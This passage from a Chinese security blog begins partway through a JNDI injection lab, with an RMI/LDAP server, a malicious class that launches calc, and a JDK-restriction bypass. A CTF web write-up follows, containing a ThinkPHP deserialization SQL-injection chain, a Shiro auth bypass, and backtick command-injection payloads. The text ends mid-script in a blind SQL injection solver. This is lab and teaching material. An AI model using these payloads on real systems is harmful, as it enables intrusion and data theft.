<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SERVER</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference aa = <span class="keyword">new</span> Reference(<span class="string">&quot;ExecTest&quot;</span>, <span class="string">&quot;ExecTest&quot;</span>, <span class="string">&quot;http://127.0.0.1:8081/&quot;</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(aa);</span><br><span class="line">        System.out.println(<span class="string">&quot;Binding &#x27;refObjWrapper&#x27; to &#x27;rmi://127.0.0.1:1099/aa&#x27;&quot;</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;aa&quot;</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> ExecTest.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.Reader;</span><br><span class="line"><span class="keyword">import</span> javax.print.attribute.standard.PrinterMessageFromOperator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExecTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException,InterruptedException</span>&#123;</span><br><span class="line">        </span><br><span class="line">        String cmd=<span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">        printMessage(process.getInputStream());;</span><br><span class="line">        printMessage(process.getErrorStream());</span><br><span class="line">        <span class="keyword">int</span> value=process.waitFor();</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printMessage</span><span class="params">(<span class="keyword">final</span> InputStream input)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="keyword">new</span> Thread (<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                Reader reader =<span class="keyword">new</span> InputStreamReader(input);</span><br><span class="line">                BufferedReader bf = <span class="keyword">new</span> BufferedReader(reader);</span><br><span class="line">                String line = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span> ((line=bf.readLine())!=<span class="keyword">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        System.out.println(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException  e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>把编译好的ExecTest.class文件放到web目录下</p>
<p><img src="https://www.hualigs.cn/image/607a712f07b8b.jpg"></p>
<p>启用web服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 -m http.server 8081</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607a712f0c50e.jpg"></p>
<p>在IDEA里执行SERVER和CLIENT，成功弹出计算器</p>
<p><img src="https://www.hualigs.cn/image/607a71313dd35.jpg"></p>
<h1 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h1><p>除了RMI服务外，JNDI还可以对接LDAP服务，只需要把lookup的地址改成<code>ldap://</code>即可，同样可以从攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。</p>
<p>适用版本</p>
<p>小于JDK 11.0.1、8u191、7u201、6u211（之后com.sun.jndi.ldap.object.trustURLCodebase属性值被调整为false）</p>
<p>这里使用工具来搭建ldap服务端 <a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
<p>安装过程</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cute-puli/p/14373826.html">https://www.cnblogs.com/cute-puli/p/14373826.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43968080/article/details/105586109">https://blog.csdn.net/qq_43968080/article/details/105586109</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;#ExecTest</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607a7130023a8.jpg"></p>
<p>跟之前一样开启http服务并把恶意类class文件复制到目录下</p>
<p><img src="https://www.hualigs.cn/image/607a71307a7c9.jpg"></p>
<p><img src="https://www.hualigs.cn/image/607a71305d929.jpg"></p>
<p>CLIENT.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Object object=<span class="keyword">new</span> InitialContext().lookup(<span class="string">&quot;ldap://192.168.111.129:1389/ExecTest&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>执行成功</p>
<p><img src="https://www.hualigs.cn/image/607a71316d72c.jpg"></p>
<h1 id="绕过高版本限制"><a href="#绕过高版本限制" class="headerlink" title="绕过高版本限制"></a>绕过高版本限制</h1><p>版本大于<code>JDK 11.0.1、8u191、7u201、6u211</code>时，之前这些利用方式都已经失效。但是仍然可以绕过</p>
<p>两种绕过方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</span><br><span class="line"></span><br><span class="line">2.利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。 </span><br></pre></td></tr></table></figure>

<p>主要依靠受害者本地<code>CLASSPATH</code>中的类，需要利用受害者本地的<code>Gadget</code>进行攻击。</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.smi1e.top/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E4%B9%8Bjndi%E6%B3%A8%E5%85%A5/">https://www.smi1e.top/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E4%B9%8Bjndi%E6%B3%A8%E5%85%A5/</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6633">https://xz.aliyun.com/t/6633</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/221917#h3-2">https://www.anquanke.com/post/id/221917#h3-2</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-16T12:35:38.000Z" title="2021-04-16T12:35:38.000Z">2021-04-16</time>发表</span><span class="level-item"><time dateTime="2021-04-16T12:42:34.128Z" title="2021-04-16T12:42:34.128Z">2021-04-16</time>更新</span><span class="level-item">8 分钟读完 (大约1206个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/16/2021%E7%BA%A2%E6%98%8E%E8%B0%B7ctf-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">2021红明谷ctf web部分复现</a></h1><div class="content"><h1 id="easytp"><a href="#easytp" class="headerlink" title="easytp"></a>easytp</h1><p>报错得到thinkphp版本为3.2.3</p>
<p><img src="https://www.hualigs.cn/image/607984ad62c03.jpg"></p>
<p>存在备份文件<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p><img src="https://www.hualigs.cn/image/607984b1ae704.jpg"></p>
<p>控制器中存在unserialize函数，需要利用反序列化漏洞</p>
<p><img src="https://www.hualigs.cn/image/607984addb770.jpg"></p>
<p>Thinkphp3.2.3反序列化漏洞（注入&amp;文件读取）</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&amp;mid=2247484711&amp;idx=1&amp;sn=0dd0f72b376b4922e4ae5b8bd614ae89&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&amp;mid=2247484711&amp;idx=1&amp;sn=0dd0f72b376b4922e4ae5b8bd614ae89&amp;scene=21#wechat_redirect</a></p>
<p>exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>    <span class="comment">// 开启才能读取文件</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;mysql&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Model();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> Mysql();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where 1=updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,32)),0)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>利用后得到当前数据库为mysql，需要查询其他数据库</p>
<p><img src="https://www.hualigs.cn/image/607984b31e8ea.jpg"></p>
<p>发现test数据库</p>
<p><img src="https://www.hualigs.cn/image/607984b3bab18.jpg"></p>
<p>查询表名，发现flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;test&#39;),1,32)),0)#</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607984b43f636.jpg"></p>
<p>查询flag，由于updatexml只能读取32位，需要分两次读取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,substr((select group_concat(flag) from test.flag),1,32)),0)#</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607984b433511.jpg"></p>
<p>读取后面的flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,substr((select group_concat(flag) from test.flag),32,32)),0)#</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607984b2c7943.jpg"></p>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7c85503e-ea45-4bfe-ac62-3f2a27998348&#125;</span><br></pre></td></tr></table></figure>



<h1 id="javaweb"><a href="#javaweb" class="headerlink" title="javaweb"></a>javaweb</h1><p>访问/login，发现Set-Cookie中存在remeberMe，判断是shiro框架</p>
<p><img src="https://www.hualigs.cn/image/607984b1ea813.jpg"></p>
<p>存在/json，但是需要登陆才能访问</p>
<p><img src="https://www.hualigs.cn/image/607984b0608bb.jpg"></p>
<p>利用Apache Shiro 身份验证绕过漏洞 CVE-2020-11989</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/14055275.html">https://www.cnblogs.com/backlion/p/14055275.html</a></p>
<p>输入<code>/;/json</code>，成功登陆，提示需要json字符串</p>
<p><img src="https://www.hualigs.cn/image/607984b1af091.jpg"></p>
<p>测试发现可以反序列化</p>
<p><img src="https://www.hualigs.cn/image/607984b06b2e1.jpg"></p>
<p>在vps中看到回显</p>
<p><img src="https://www.hualigs.cn/image/607984b1369ef.jpg"></p>
<p>jackson反序列化，利用工具 <a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
<p><img src="https://www.hualigs.cn/image/607984b1bafe3.jpg"></p>
<p>Spring利用链，直接利用工具即可</p>
<p><img src="https://www.hualigs.cn/image/607984b2acd79.jpg"></p>
<p><img src="https://www.hualigs.cn/image/607984b1086e8.jpg"></p>
<p>成功带出flag</p>
<p><img src="https://www.hualigs.cn/image/607984b0513b6.jpg"></p>
<h1 id="write-shell"><a href="#write-shell" class="headerlink" title="write_shell"></a>write_shell</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = waf(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = check(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        waf(<span class="variable">$data</span>);</span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>



<p>反引号执行命令，空格被过滤，使用<code>$IFS</code>绕过，也可以用<code>%09</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2ze08g0rhfwaewll9qad.cloudeci1.ichunqiu.com&#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls\$IFS\$9&#x2F;&#96;?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607984ad4ca06.jpg"></p>
<p>读取flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2ze08g0rhfwaewll9qad.cloudeci1.ichunqiu.com&#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\$IFS\$9\&#96;echo\$IFS\$9LyF3aGF0eW91d2FudGdnZ2dnZ2c0MDEucGhw|base64\$IFS\$9-d\&#96;&#96;?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607984ad5bb46.jpg"></p>
<h1 id="happsql"><a href="#happsql" class="headerlink" title="happsql"></a>happsql</h1><p>布尔盲注。可以使用<code>regexp盲注</code>和<code>exp报错盲注</code>，后面还需要用到无列名注入的知识。</p>
<p>regexp盲注，由于^被过滤，所以需要使用十六进制编码绕过，题目中过滤了information_schema，需要先读取mysql.innodb_table_stats来获得表名然后再进行无列名注入。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;-,.&quot;</span>:</span><br><span class="line">    <span class="comment"># for i in string.printable:</span></span><br><span class="line">        url = <span class="string">&quot;http://eci-2ze6jljai3r428c1jf6q.cloudeci1.ichunqiu.com/login.php&quot;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&quot;http://eci-2zej5nwlszgd0g0na5qf.cloudeci1.ichunqiu.com/index.php&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&quot;http://eci-2zej5nwlszgd0g0na5qf.cloudeci1.ichunqiu.com&quot;</span>,</span><br><span class="line">            <span 